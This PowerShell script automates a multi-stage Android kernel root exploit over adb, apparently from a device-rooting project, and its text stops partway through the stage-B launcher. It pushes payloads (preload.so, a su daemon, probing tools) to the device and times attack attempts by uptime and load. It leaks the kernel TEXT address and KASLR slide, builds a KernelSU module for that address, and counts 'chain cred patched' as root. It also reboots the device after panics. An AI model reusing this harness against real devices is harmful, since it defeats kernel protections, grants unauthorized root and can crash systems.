[CmdletBinding()]
param(
    [Parameter(Position = 0)]
    [ValidateRange(1, 1000)]
    [int]$MaxCycles = 3
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$RepoRoot = Split-Path -Parent $PSScriptRoot
Set-Location -LiteralPath $RepoRoot
. (Join-Path $PSScriptRoot 'WindowsCommon.ps1')

$DL = '/data/local/tmp'
$UPTIME_FIRE_MAX = 320
$UPTIME_REBOOT_AT = 660
$LOAD_MAX_LATE = 16
$LOAD_MAX_EARLY = 26
$LOAD_EARLY_UNTIL = 120
$B_RETRIES = 2
$GATE_MAX_TRIES = 2
$A_SLOT_LIST = @('1', '2')

function Get-EnvOr {
    param([string]$Name, [string]$Default)
    $value = [Environment]::GetEnvironmentVariable($Name)
    if ([string]::IsNullOrEmpty($value)) { return $Default }
    return $value
}

$script:AdbExe = Get-EnvOr 'ADB' 'adb'
$serial = Get-EnvOr 'S' (Get-EnvOr 'ANDROID_SERIAL' '')
$script:AdbSerial = $serial
$script:AdbParts = @($script:AdbExe)
if ($serial) { $script:AdbParts += @('-s', $serial) }

$script:BVerdictTimeout = [int](Get-EnvOr 'B_VERDICT_TIMEOUT' '600')
$script:AllowReboot = (Get-EnvOr 'ALLOW_REBOOT' '1') -eq '1'
$script:ATimeout = [int](Get-EnvOr 'A_TIMEOUT' '45')
$script:MaxReboots = [int](Get-EnvOr 'MAX_REBOOTS' '3')
$script:SkipBuild = (Get-EnvOr 'SKIP_BUILD' '0') -eq '1'
$script:SyncOnly = (Get-EnvOr 'SYNC_ONLY' '0') -eq '1'
$script:NormalizeOnly = (Get-EnvOr 'NORMALIZE_ONLY' '0') -eq '1'

$PreloadSrc = Get-EnvOr 'PRELOAD' 'payloads/preload.so'
$Psl2Src = Get-EnvOr 'PSL2' 'tools/psl2'
$script:SuBin = Get-EnvOr 'SU_BIN' 'build/embed/su_daemon_aarch64_pie'
$script:BandscanSrc = Get-EnvOr 'BANDSCAN' 'tools/bandscan'
$script:Kallsyms = Get-EnvOr 'KALLSYMS' (Join-Path $RepoRoot 'tools/kallsyms.new')
$script:Manifest = Get-EnvOr 'MANIFEST' 'manifest.txt'
$script:BuildLog = 'build.log'

$script:DriverLog = 'driver.log'
$script:BashPath = Resolve-BashPath

$script:Up = ''
$script:L1 = ''
$script:Enf = ''
$script:Bid = ''
$script:OldBid = ''
$script:RamoopsDone = 0
$script:Reboots = 0
$script:Panic = 0
$script:AVerdict = ''
$script:BVerdict = ''
$script:BL = ''
$script:Text1 = ''
$script:Cycle = 0
$script:Win = 0
$script:GateRc = 0

$KERNEL_PANIC_MARKS = @('Internal error', 'Kernel panic', 'Unable to handle kernel')
$B_POLL_MARKS = @('chain cred patched', 'L-pre-gate exhausted', 'v114 probe miss',
    'abandon arm -> clean park', 'Internal error', 'Kernel panic', 'Unable to handle')

function Format-NativeArg {
    param([AllowEmptyString()][string]$Arg)

    if ($Arg.Length -gt 0 -and $Arg -notmatch '[\s"]') { return $Arg }

    $sb = New-Object System.Text.StringBuilder
    [void]$sb.Append('"')
    $slashes = 0
    foreach ($ch in $Arg.ToCharArray()) {
        if ($ch -eq '\') { $slashes++; continue }
        if ($ch -eq '"') {
            [void]$sb.Append(('\' * ($slashes * 2 + 1)))
            [void]$sb.Append('"')
        } else {
            [void]$sb.Append(('\' * $slashes))
            [void]$sb.Append($ch)
        }
        $slashes = 0
    }
    [void]$sb.Append(('\' * ($slashes * 2)))
    [void]$sb.Append('"')
    $sb.ToString()
}

function Invoke-Native {
    param(
        [string]$FilePath,
        [string[]]$ArgumentList,
        [int]$TimeoutSec = 30,
        [switch]$MergeStderr,
        [switch]$Raw
    )

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $FilePath
    $psi.Arguments = (($ArgumentList | ForEach-Object { Format-NativeArg $_ }) -join ' ')
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.WorkingDirectory = $RepoRoot

    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $psi
    [void]$proc.Start()

    $errTask = $proc.StandardError.ReadToEndAsync()

    $rawStream = $null
    if ($Raw) {
        $rawStream = New-Object System.IO.MemoryStream
        $outTask = $proc.StandardOutput.BaseStream.CopyToAsync($rawStream)
    } else {
        $outTask = $proc.StandardOutput.ReadToEndAsync()
    }

    $timedOut = $false
    try { $timedOut = -not $outTask.Wait($TimeoutSec * 1000) } catch { $timedOut = $true }
    if ($timedOut) {
        try { $proc.Kill() } catch { }
    }
    try { [void]$proc.WaitForExit(5000) } catch { }

    $result = @{ Rc = 124; Text = ''; Bytes = $null }
    if ($timedOut) {
        if ($null -ne $rawStream) { $result.Bytes = $rawStream.ToArray() }
        return $result
    }

    $result.Rc = $proc.ExitCode
    if ($Raw) {
        $result.Bytes = $rawStream.ToArray()
    } else {
        $stdout = $outTask.GetAwaiter().GetResult()
        $text = $stdout -replace "`r", ''
        if ($MergeStderr) {
            try { $stderr = $errTask.GetAwaiter().GetResult() } catch { $stderr = '' }
            $text += ($stderr -replace "`r", '')
        }
        $result.Text = $text
    }
    return $result
}

function Invoke-Adb {
    param(
        [string[]]$AdbArgs,
        [int]$TimeoutSec = 30,
        [switch]$MergeStderr,
        [switch]$Raw
    )
    $argv = @($script:AdbParts) + $AdbArgs
    Invoke-Native -FilePath $argv[0] -ArgumentList $argv[1..($argv.Count - 1)] `
        -TimeoutSec $TimeoutSec -MergeStderr:$MergeStderr -Raw:$Raw
}

function Write-Log {
    param([string]$Message)
    $line = '[' + (Get-Date).ToString('HH:mm:ss') + '] ' + $Message
    [Console]::Out.WriteLine($line)
    [Console]::Out.Flush()
    $sw = [System.IO.StreamWriter]::new($script:DriverLog, $true, [System.Text.UTF8Encoding]::new($false))
    try { $sw.WriteLine($line) } finally { $sw.Dispose() }
}

function Stop-Fatal {
    param([string]$Message)
    Write-Log ('FATAL: ' + $Message)
    exit 1
}

function Boot-IdShort {
    param([string]$Value)
    if ($null -eq $Value) { return '' }
    return $Value.Substring(0, [Math]::Min(8, $Value.Length))
}

function Get-FileMd5 {
    param([string]$Path)
    try {
        return (Get-FileHash -LiteralPath $Path -Algorithm MD5).Hash.ToLower()
    } catch {
        return ''
    }
}

function Get-FileMd5Short {
    param([string]$Path)
    $hash = Get-FileMd5 $Path
    if (-not $hash) { return '--------' }
    return $hash.Substring(0, 8)
}

function Write-Utf8NoBom {
    param(
        [string]$Path,
        [AllowEmptyString()][string]$Text
    )
    $enc = New-Object System.Text.UTF8Encoding($false)
    [System.IO.File]::WriteAllText($Path, $Text, $enc)
}

function Resolve-RepoPath {
    param([string]$Path)
    if ([System.IO.Path]::IsPathRooted($Path)) { return $Path }
    return (Join-Path $RepoRoot $Path)
}

function Get-LineCount {
    param([string]$Path)
    try { return @(Get-Content -LiteralPath $Path).Count } catch { return 0 }
}

function Get-ByteCount {
    param([string]$Path)
    try { return (Get-Item -LiteralPath $Path).Length } catch { return 0 }
}

function Read-RawText {
    param([string]$Path)
    try { return Get-Content -LiteralPath $Path -Raw } catch { return '' }
}

function Invoke-BuildArtifacts {
    if ($script:SkipBuild) {
        Write-Log 'build: SKIP_BUILD=1 -- 沿用现有产物（不推荐，md5 非本次编译所得）'
        return
    }

    if (-not (Get-Command make -ErrorAction SilentlyContinue)) {
        Stop-Fatal 'make was not found on PATH (install GNU Make or add it to PATH)'
    }

    $t0 = [DateTimeOffset]::Now.ToUnixTimeSeconds()
    Write-Log 'build: make (clean -> tools -> payload) 开始'
    try {
        $r = Invoke-Native -FilePath 'make' -ArgumentList @() -TimeoutSec 900 -MergeStderr
    } catch {
        Write-Log '  BUILD FAILED（无法启动 make，详见上方错误）'
        Stop-Fatal '构建失败，终止发射'
    }

    $buildLog = Resolve-RepoPath $script:BuildLog
    Write-Utf8NoBom -Path $buildLog -Text $r.Text
    if ($r.Rc -ne 0) {
        Write-Log "  BUILD FAILED（rc=$($r.Rc)，详见 $($script:BuildLog)）"
        $lines = @($r.Text -split "`n")
        $start = [Math]::Max(0, $lines.Count - 20)
        for ($i = $start; $i -lt $lines.Count; $i++) { Write-Host $lines[$i] }
        Stop-Fatal '构建失败，终止发射'
    }

    $ver = 'unknown'
    try {
        $ir = Invoke-Native -FilePath 'make' -ArgumentList @('info') -TimeoutSec 120 -MergeStderr
        $m = [regex]::Match($ir.Text, '(?m)^GL_VERSION=(.+)$')
        if ($m.Success) { $ver = $m.Groups[1].Value.Trim() }
    } catch {
        $ver = 'unknown'
    }
    $dur = [DateTimeOffset]::Now.ToUnixTimeSeconds() - $t0
    Write-Log "  build ok，耗时 ${dur}s，版本=$ver（log: $($script:BuildLog)）"
}

function Get-ManifestEntries {
    $entries = @()
    $path = Resolve-RepoPath $script:Manifest
    if (-not (Test-Path -LiteralPath $path -PathType Leaf)) { return $entries }
    foreach ($line in @(Get-Content -LiteralPath $path)) {
        if ([string]::IsNullOrWhiteSpace($line)) { continue }
        $parts = $line.Split('|')
        if ($parts.Count -lt 4) { continue }
        $entries += [pscustomobject]@{
            Name = $parts[0]
            Src  = $parts[1]
            Exec = $parts[2]
            Md5  = $parts[3]
        }
    }
    return $entries
}

function Add-ManifestEntry {
    param(
        [string]$Name,
        [string]$Src,
        [int]$ExecFlag = 0
    )

    $full = Resolve-RepoPath $Src
    if (-not (Test-Path -LiteralPath $full -PathType Leaf)) { return }
    $md5 = Get-FileMd5 $full
    if (-not $md5) { return }

    $line = '{0}|{1}|{2}|{3}' -f $Name, $Src, $ExecFlag, $md5
    $manifest = Resolve-RepoPath $script:Manifest
    [System.IO.File]::AppendAllText($manifest, $line + "`n", [System.Text.UTF8Encoding]::new($false))
    Write-Log "  manifest $Name md5=$md5"
}

function Get-DeviceMd5 {
    param([string]$Dst)

    $r = Invoke-Adb -AdbArgs @('shell', "md5sum '$Dst' 2>/dev/null") -TimeoutSec 20
    $line = $r.Text -split "`n" | Where-Object { $_.Trim() } | Select-Object -First 1
    if (-not $line) { return '' }
    return (($line.Trim() -split '\s+')[0])
}

function Invoke-NormPerms {
    param([string]$Dst, [int]$ExecFlag = 0)

    $mode = if ($ExecFlag -eq 1) { '777' } else { '666' }
    $r = Invoke-Adb -AdbArgs @('shell', "chown shell:shell $Dst 2>/dev/null; chmod $mode $Dst") -TimeoutSec 20
    if ($r.Rc -eq 0) {
        Write-Log "  perms $Dst -> shell:shell $mode"
    } else {
        Write-Log "  WARNING: perm normalize failed for $Dst"
    }
}

function Invoke-SyncFile {
    param(
        [string]$Src,
        [string]$Dst,
        [int]$ExecFlag = 0,
        [string]$Want = ''
    )

    $base = Split-Path -Leaf $Dst
    $srcFull = Resolve-RepoPath $Src
    $cur = Get-FileMd5 $srcFull
    if (-not $cur) {
        Write-Log "  [sync] $base SKIP (宿主文件缺失: $Src)"
        return 2
    }
    if ($Want -and $cur -ne $Want) {
        Write-Log "  [sync] $base 产物在清单生成后发生变化 (清单=$Want 当前=$cur) -- 以当前产物为准"
    }
    $want = $cur

    $have = Get-DeviceMd5 $Dst
    if ($have -and $have -eq $want) {
        Write-Log "  [sync] $base OK md5=$want"
        Invoke-NormPerms -Dst $Dst -ExecFlag $ExecFlag
        return 0
    }
    if ($have) {
        Write-Log "  [sync] $base MISMATCH device=$have host=$want -> 重新上传"
    } else {
        Write-Log "  [sync] $base MISSING -> 上传"
    }

    $push = Invoke-Adb -AdbArgs @('push', $srcFull, $Dst) -TimeoutSec 120
    if ($push.Rc -ne 0) {
        Write-Log "  [sync] $base FAIL push 失败"
        return 2
    }
    $have = Get-DeviceMd5 $Dst
    if ($have -ne $want) {
        Write-Log "  [sync] $base FAIL md5 复核 device=$have host=$want"
        return 2
    }
    Write-Log "  [sync] $base SYNCED md5=$want 通过"
    Invoke-NormPerms -Dst $Dst -ExecFlag $ExecFlag
    return 1
}

function Invoke-SyncManifest {
    $failed = $false
    foreach ($entry in @(Get-ManifestEntries)) {
        $rc = Invoke-SyncFile -Src $entry.Src -Dst "$DL/$($entry.Name)" `
            -ExecFlag ([int]$entry.Exec) -Want $entry.Md5
        if ($rc -eq 2) { $failed = $true }
    }
    return (-not $failed)
}

function Invoke-NormalizeAsRoot {
    foreach ($entry in @(Get-ManifestEntries)) {
        $mode = if ([string]$entry.Exec -eq '1') { '777' } else { '666' }
        $dst = "$DL/$($entry.Name)"
        $r = Invoke-Adb -AdbArgs @('shell', "$DL/su -c 'chown shell:shell $dst; chmod $mode $dst'") -TimeoutSec 20
        if ($r.Rc -eq 0) {
            Write-Log "  root perms $dst -> shell:shell $mode"
        } else {
            Write-Log "  WARNING: root perm normalize failed for $dst"
        }
    }
}

function Read-State {
    $r = Invoke-Adb -AdbArgs @('shell', 'cat /proc/uptime; cat /proc/loadavg; getenforce; cat /proc/sys/kernel/random/boot_id') -TimeoutSec 15
    if ($r.Rc -ne 0) { return $false }
    $text = $r.Text
    if ([string]::IsNullOrWhiteSpace($text)) { return $false }

    $lines = $text -split "`n"
    $script:Up = ''
    $script:L1 = ''
    $script:Enf = ''
    $script:Bid = ''
    if ($lines.Count -gt 0) { $script:Up = ($lines[0] -split ' ')[0].Trim() }
    if ($lines.Count -gt 1) { $script:L1 = ($lines[1] -split ' ')[0].Trim() }
    if ($lines.Count -gt 2) { $script:Enf = $lines[2].Trim() }
    if ($lines.Count -gt 3) { $script:Bid = $lines[3].Trim() }

    return (-not [string]::IsNullOrEmpty($script:Up) -and -not [string]::IsNullOrEmpty($script:Bid))
}

function Test-Online {
    $r = Invoke-Adb -AdbArgs @('get-state') -TimeoutSec 8
    return ($r.Text.Trim() -eq 'device')
}

function Get-BootReason {
    $r = Invoke-Adb -AdbArgs @('shell', 'getprop persist.sys.boot.reason.history') -TimeoutSec 15
    return (($r.Text -split "`n" | ForEach-Object { $_.Trim() }) -join ' ').Trim()
}

function Wait-Device {
    param([string]$ExpectBootId = '')
    for ($i = 1; $i -le 90; $i++) {
        if (Test-Online) {
            Start-Sleep -Seconds 3
            if (Read-State) {
                if (-not $ExpectBootId -or $script:Bid -ne $ExpectBootId) {
                    $script:RamoopsDone = 0
                    Capture-Ramoops (Get-Date).ToString('HHmmss')
                    return $true
                }
            }
        }
        Start-Sleep -Seconds 2
    }
    return $false
}

function Wait-NewBoot {
    for ($i = 1; $i -le 90; $i++) {
        if (Test-Online) {
            Start-Sleep -Seconds 3
            if ((Read-State) -and $script:Bid -ne $script:OldBid) {
                $script:RamoopsDone = 0
                Capture-Ramoops (Get-Date).ToString('HHmmss')
                Write-Log ("  new boot_id=$(Boot-IdShort $script:Bid) uptime=$($script:Up)s enforce=$($script:Enf)")
                return $true
            }
        }
        Start-Sleep -Seconds 2
    }
    return $false
}

function Capture-Ramoops {
    param([string]$Stamp)
    if ($script:RamoopsDone -eq 1) { return }

    $dst = "ramoops$(if ($Stamp) { '_' + $Stamp }).txt"
    $r = Invoke-Adb -AdbArgs @('exec-out', 'cat /sys/fs/pstore/console-ramoops-0') -TimeoutSec 60 -Raw
    $data = if ($null -ne $r.Bytes) { $r.Bytes } else { [byte[]]@() }
    [System.IO.File]::WriteAllBytes((Join-Path $RepoRoot $dst), $data)

    $n = $data.Length
    if ($n -gt 1000) {
        Write-Log "  ramoops captured $n bytes -> $dst (md5 $(Get-FileMd5Short $dst))"
        $headBytes = $data[0..([Math]::Min(299, $n - 1))]
        $head = ([System.Text.Encoding]::UTF8.GetString($headBytes)) -replace "`r?`n", ' '
        Write-Log "  ramoops head: $head"
        $script:RamoopsDone = 1
    } else {
        Write-Log "  ramoops empty/absent ($n bytes)"
        Remove-Item -LiteralPath (Join-Path $RepoRoot $dst) -Force -ErrorAction SilentlyContinue
    }
}

function Invoke-PanicCheck {
    param([string]$Path)
    $script:Panic = 0
    if ((Get-ByteCount $Path) -eq 0) { return }

    $data = Read-RawText $Path
    $hit = $false
    foreach ($mark in $KERNEL_PANIC_MARKS) { if ($data.Contains($mark)) { $hit = $true; break } }
    if (-not $hit) { return }

    $script:Panic = 1
    Write-Log "  !! PANIC signature in $Path -- capturing ramoops"
    if (Test-Online) {
        $outName = 'panic_ramoops.txt'
        $r = Invoke-Adb -AdbArgs @('exec-out', 'cat /sys/fs/pstore/console-ramoops-0') -TimeoutSec 60 -Raw
        $data2 = if ($null -ne $r.Bytes) { $r.Bytes } else { [byte[]]@() }
        [System.IO.File]::WriteAllBytes((Join-Path $RepoRoot $outName), $data2)
        Write-Log "  ramoops: $($data2.Length) bytes -> $outName"
    } else {
        Write-Log '  device offline (panic rebooting)'
    }
}

function Invoke-RebootOnce {
    if (-not $script:AllowReboot) {
        Write-Log '  reboot disallowed (ALLOW_REBOOT=0)'
        return $false
    }
    if ($script:Reboots -ge $script:MaxReboots) {
        Write-Log "  reboot budget exhausted ($($script:Reboots)/$($script:MaxReboots)) -> STOP (no spin)"
        return $false
    }
    $script:Reboots++

    if (-not (Test-Online)) {
        Write-Log '  device offline (panic-induced reboot in flight) -> waiting for the new boot'
        return (Wait-NewBoot)
    }

    $r = Invoke-Adb -AdbArgs @('shell', 'setprop debug.omp.probe 1; getprop debug.omp.probe') -TimeoutSec 12
    $pr = $r.Text.Trim()
    if ($pr -ne '1') {
        Write-Log "  property service dead (probe=$pr) -> cannot self-reboot"
        return $false
    }
    Write-Log "  self-reboot $($script:Reboots)/$($script:MaxReboots) (boot_id $(Boot-IdShort $script:Bid))"
    [void](Invoke-Adb -AdbArgs @('shell', 'sync') -TimeoutSec 20)
    $script:RamoopsDone = 0
    $script:OldBid = $script:Bid
    [void](Invoke-Adb -AdbArgs @('reboot') -TimeoutSec 40)
    return (Wait-NewBoot)
}

function Invoke-Gate {
    if (-not (Read-State)) { return 1 }
    Write-Log "STATE uptime=$($script:Up)s load1=$($script:L1) enforce=$($script:Enf) boot_id=$(Boot-IdShort $script:Bid)"
    Write-Log "  boot_reason_history: $(Get-BootReason)"

    $upNum = 0.0
    $l1Num = 0.0
    if (-not [double]::TryParse($script:Up, [ref]$upNum) -or
        -not [double]::TryParse($script:L1, [ref]$l1Num)) {
        Write-Log '  GATE-WAIT uptime/load unparsable'
        return 1
    }

    $lm = $LOAD_MAX_LATE
    if ([Math]::Floor($upNum) -lt $LOAD_EARLY_UNTIL) { $lm = $LOAD_MAX_EARLY }

    if ($upNum -le 0 -or $upNum -ge 100000) { Write-Log '  GATE-WAIT uptime insane'; return 1 }
    if ($l1Num -lt 0 -or $l1Num -ge 2000) { Write-Log '  GATE-WAIT loadavg insane'; return 1 }

    if ($script:Enf -ne 'Enforcing') {
        Write-Log "  GATE-REBOOT enforce=$($script:Enf) (!=Enforcing; reboot is the only reset)"
        return 2
    }
    if ($upNum -gt $UPTIME_REBOOT_AT) {
        Write-Log ("  GATE-REBOOT uptime={0:F0}s > {1:F0}s  [P3] band dead -> reboot" -f $upNum, $UPTIME_REBOOT_AT)
        return 2
    }
    if ($l1Num -gt $lm) {
        Write-Log ("  GATE-WAIT load1={0} > {1} (uptime {2:F0}s) -- transient; bounded retry" -f $l1Num, $lm, $upNum)
        return 1
    }
    if ($upNum -gt $UPTIME_FIRE_MAX) {
        Write-Log ("  GATE-PASS uptime={0:F0}s > {1:F0}s (window nearly shut) load1={2}" -f $upNum, $UPTIME_FIRE_MAX, $l1Num)
    } else {
        Write-Log ("  GATE-PASS uptime={0:F0}s load1={1} limit={2}" -f $upNum, $l1Num, $lm)
    }
    return 0
}

function Start-BashCommandFile {
    param([string]$CommandFile, [string]$RedirectFile)

    if (-not $script:BashPath) { Stop-Fatal '找不到 Git Bash' }

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $env:ComSpec
    $psi.Arguments = '/c "' + $script:BashPath + '" ' + $CommandFile + ' > ' + $RedirectFile + ' 2>&1'
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.WorkingDirectory = $RepoRoot

    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $psi
    [void]$proc.Start()
    [void]$proc.StandardOutput.ReadToEndAsync()
    [void]$proc.StandardError.ReadToEndAsync()
    return $proc
}

function Invoke-FireA {
    param([string]$Slot)

    $cycle = $script:Cycle
    $al = "a${cycle}s${Slot}_full.log"
    $cmdPath = "a${cycle}s${Slot}_command.txt"

    $tpl = Read-RawText (Join-Path $RepoRoot 'scripts/a_command.txt')
    if ([string]::IsNullOrEmpty($tpl)) { Stop-Fatal 'missing host input scripts/a_command.txt' }

    $d = [regex]::Replace($tpl, 'SLIDE_LOCK_SLOT=[0-9]*', "SLIDE_LOCK_SLOT=$Slot")
    $d = [regex]::Replace($d, 'tee a_full\.log', "tee $al")
    $d = [regex]::Replace($d, '(?m)^timeout 60 ', "timeout $($script:ATimeout) ")
    Write-Utf8NoBom -Path (Join-Path $RepoRoot $cmdPath) -Text $d

    Write-Log "A fire slot=$Slot (cmd md5 $(Get-FileMd5Short $cmdPath))"
    $t0 = [DateTimeOffset]::Now.ToUnixTimeSeconds()
    $proc = Start-BashCommandFile -CommandFile $cmdPath -RedirectFile $al
    $proc.WaitForExit()
    $dur = [DateTimeOffset]::Now.ToUnixTimeSeconds() - $t0

    $log = Read-RawText (Join-Path $RepoRoot $al)
    $hasWin = $log.Contains('one-walk WIN')
    $hasMiss = $log.Contains('one-walk MISS')
    $hasPanic = $false
    foreach ($m in $KERNEL_PANIC_MARKS) { if ($log.Contains($m)) { $hasPanic = $true; break } }
    $reachedKill = $log.Contains('slide consumer tgkill')

    if ($hasWin -and -not $hasMiss) { $script:AVerdict = 'WIN' }
    elseif ($hasPanic) { $script:AVerdict = 'PANIC' }
    elseif ($hasMiss) { $script:AVerdict = 'MISS' }
    elseif ($reachedKill) { $script:AVerdict = 'TRUNC' }
    else { $script:AVerdict = 'UNKNOWN' }

    if ($script:AVerdict -eq 'TRUNC' -or $script:AVerdict -eq 'UNKNOWN') {
        Start-Sleep -Seconds 6
        [void](Read-State)
        $curBid = if ($script:Bid) { $script:Bid } else { 'X' }
        $oldBid = if ($script:OldBid) { $script:OldBid } else { 'Y' }
        if ($curBid -ne $oldBid -or -not (Test-Online)) {
            $script:AVerdict = 'PANIC'
            Write-Log '  log truncated at kill edge + boot_id changed/offline -> PANIC'
        } elseif ($dur -lt ($script:ATimeout - 5)) {
            $script:AVerdict = 'PANIC'
            Write-Log "  log truncated + exited in ${dur}s (far too early for a walk) -> PANIC"
        } else {
            Write-Log "  no verdict but device alive after ${dur}s -> treating as MISS"
            $script:AVerdict = 'MISS'
        }
    }
    Write-Log "A verdict slot=$Slot => $($script:AVerdict) (dur=${dur}s, $(Get-LineCount $al) lines)"
}

function Select-LastMatch {
    param([string]$Text, [string]$Pattern)
    $ms = [regex]::Matches($Text, $Pattern)
    if ($ms.Count -eq 0) { return '' }
    return $ms[$ms.Count - 1].Groups[1].Value
}

function Invoke-TailPsl2 {
    $out1 = 'psl2_w1.txt'
    $out2 = 'psl2_w2.txt'

    Write-Log 'psl2 win1'
    $r = Invoke-Adb -AdbArgs @('shell', "cd $DL && ./psl2 2500000 25 2>&1") -TimeoutSec 40
    Write-Utf8NoBom -Path (Join-Path $RepoRoot $out1) -Text $r.Text
    $text1 = $r.Text
    $t1 = Select-LastMatch $text1 '.*TEXT=(0x[0-9a-f]+).*'
    $s1 = Select-LastMatch $text1 '(?m)^SLIDE=([0-9]*)$'

    if (-not $t1) {
        Write-Log 'ABORT: no TEXT win1'
        return 5
    }

    Write-Log 'psl2 win2'
    $r = Invoke-Adb -AdbArgs @('shell', "cd $DL && ./psl2 2000000 25 2>&1") -TimeoutSec 40
    Write-Utf8NoBom -Path (Join-Path $RepoRoot $out2) -Text $r.Text
    $text2 = $r.Text
    $t2 = Select-LastMatch $text2 '.*TEXT=(0x[0-9a-f]+).*'
    $s2 = Select-LastMatch $text2 '(?m)^SLIDE=([0-9]*)$'

    $MB2 = [uint64](2 * 1024 * 1024)
    $KB = [Convert]::ToUInt64('ffffffc008000000', 16)
    $Arm64VaMin = [Convert]::ToUInt64('ffff000000000000', 16)
    $SlideMax = [Convert]::ToUInt64('8000000000', 16)
    $tv1 = [uint64]0
    $tv2 = [uint64]0
    $sv1 = [uint64]0
    $sv2 = [uint64]0
    try {
        $tv1 = [Convert]::ToUInt64($t1.Substring(2), 16)
        $tv2 = [Convert]::ToUInt64($t2.Substring(2), 16)
        $sv1 = [Convert]::ToUInt64($s1, 10)
        $sv2 = [Convert]::ToUInt64($s2, 10)
    } catch {
        Write-Log "  asserts FAILED: unparsable psl2 output TEXT=$t1/$t2 SLIDE=$s1/$s2"
        return 6
    }

    $fail = $null
    if ($tv1 -ne $tv2) { $fail = "TEXT mismatch $(Format-Hex64 $tv1) $(Format-Hex64 $tv2)" }
    elseif ($sv1 -ne $sv2) { $fail = "SLIDE field mismatch $sv1 $sv2" }
    elseif (($tv1 % $MB2) -ne 0) { $fail = 'TEXT not 2MB aligned' }
    elseif ($tv1 -lt $Arm64VaMin) { $fail = 'TEXT outside arm64 kernel VA' }
    elseif (($tv1 - $KB) -ne $sv1) { $fail = "cross-check: TEXT-BASE=$(Format-Hex64 ($tv1 - $KB)) vs SLIDE=$sv1" }
    elseif ($sv1 -eq 0 -or $sv1 -ge $SlideMax) { $fail = 'slide outside 512GB KASLR' }
    if ($fail) {
        Write-Log "  asserts FAILED: $fail"
        return 6
    }
    Write-Log "  asserts OK TEXT=$($t1) SLIDE=$($sv1) ($([Math]::Floor($sv1 / $MB2))x2MB)"

    Write-Log "bake kernelko for TEXT=$t1"
    $koRel = 'ksu/kernelsu-device-ready.ko'
    if (-not (Invoke-MakeDeviceKo -Text $t1 -OutputRel $koRel)) { return 7 }
    Write-Log "  ko $(Get-FileMd5Short (Join-Path $RepoRoot $koRel))"

    $rc = Invoke-SyncFile -Src $koRel -Dst "$DL/kernelsu-device-ready.ko" -ExecFlag 0
    if ($rc -eq 2) { return 8 }
    [void](Invoke-Adb -AdbArgs @('shell', 'sync') -TimeoutSec 25)
    return 0
}

function Format-Hex64 {
    param([uint64]$Value)
    return '0x' + $Value.ToString('x')
}

function Invoke-MakeDeviceKo {
    param([string]$Text, [string]$OutputRel)

    $baseKo = Join-Path $RepoRoot 'ksu/kernelsu-android14-6.1-local.ko'
    if (-not (Test-Path -LiteralPath $baseKo)) {
        Write-Log "ERROR: base ko not found: $baseKo"
        return $false
    }
    $outAbs = Join-Path $RepoRoot ($OutputRel -replace '/', '\')

    $python = $null
    $pyPrefix = @()
    foreach ($cand in @('python', 'python3')) {
        $cmd = Get-Command $cand -ErrorAction SilentlyContinue
        if ($cmd) { $python = $cand; break }
    }
    if (-not $python) {
        $cmd = Get-Command 'py' -ErrorAction SilentlyContinue
        if ($cmd) { $python = 'py'; $pyPrefix = @('-3') }
    }
    if (-not $python) {
        Write-Log 'ERROR: no host python found (need python, python3 or py -3 on PATH)'
        return $false
    }

    $pyArgs = $pyPrefix + @('ksu/make_device_ko.py', '--ko', $baseKo, '--kallsyms', $script:Kallsyms,
        '--text', $Text, '--out', $outAbs)
    $r = Invoke-Native -FilePath $python -ArgumentList $pyArgs -TimeoutSec 300 -MergeStderr
    if ($r.Rc -ne 0 -or -not (Test-Path -LiteralPath $outAbs)) {
        Write-Log "ERROR: make_device_ko.py failed rc=$($r.Rc)"
        Write-Log $r.Text
        return $false
    }
    return $true
}

function New-BCommandFile {
    param([string]$Slot, [string]$Try)

    $d = Read-RawText (Join-Path $RepoRoot 'scripts/b_command.txt')
    if ([string]::IsNullOrEmpty($d)) { throw "empty or missing scripts/b_command.txt" }

    $d = $d.Replace('SLIDE_TEXT_ADDR=0xffffffd8f0c00000', 'SLIDE_TEXT_ADDR=' + $script:Text1)
    $d = [regex]::Replace($d, 'SLIDE_LOCK_SLOT=\d+', "SLIDE_LOCK_SLOT=$Slot")
    $d = $d.Replace('SLIDE_V155_RESAMPLE=12', 'SLIDE_V155_RESAMPLE=16')
    $d = $d.Replace('tee b_full.log', "tee b_t${Try}_full.log")
    $d = $d.Replace('timeout 300 ${ADB} shell', 'timeout 600 ' + ($script:AdbParts -join ' ') + ' shell')

    $outName = "b_t${Try}_command.txt"
    Write-Utf8NoBom -Path (Join-Path $RepoRoot $outName) -Text $d

    foreach ($k in @('SLIDE_TEXT_ADDR', 'SLIDE_LOCK_SLOT', 'SLIDE_V155_RESAMPLE')) {
        $m = [regex]::Match($d, ($k + '=\S+'))
        [Console]::Out.WriteLine('   ' + $(if ($m.Success) { $m.Value } else { "$k MISSING" }))
    }
    if (-not ($d.Contains('SLIDE_V155_RESAMPLE=16') -and $d.Contains($script:Text1) -and
            $d.Contains("SLIDE_LOCK_SLOT=$Slot"))) {
        throw 'template substitution failed'
    }
    if (-not $d.Contains("b_t${Try}_full.log")) { throw 'per-try log substitution failed' }
    return $outName
}

function Get-BVerdict {
    param([string]$LogPath)
    $d = Read-RawText $LogPath
    if ($d.Contains('chain cred patched')) { return 'ROOT' }
    if ($d.Contains('L-pre-gate exhausted')) { return 'REJECT' }
    if ($d.Contains('v114 probe miss')) { return 'MISS' }
    if ($d.Contains('abandon arm -> clean park')) { return 'ARM-ABANDON' }
    foreach ($m in $KERNEL_PANIC_MARKS) { if ($d.Contains($m)) { return 'PANIC' } }
    if ($d.Contains('L-pre-gate PASS')) { return 'PASS' }
    return 'NONE'
}

function Invoke-FireB {
    param([string]$Slot, [string]$Try)

    $cmdPath = ''
    try {
        $cmdPath = New-BCommandFile -Slot $Slot -Try $Try
    } catch {
        [Console]::Error.WriteLine($_.Exception.Message)
        return 9
    }
    $script:BL = "b_t${Try}_full.log"
    Write-Log "B fire slot=$Slot try=$Try (cmd md5 $(Get-FileMd5Short $cmdPath))"

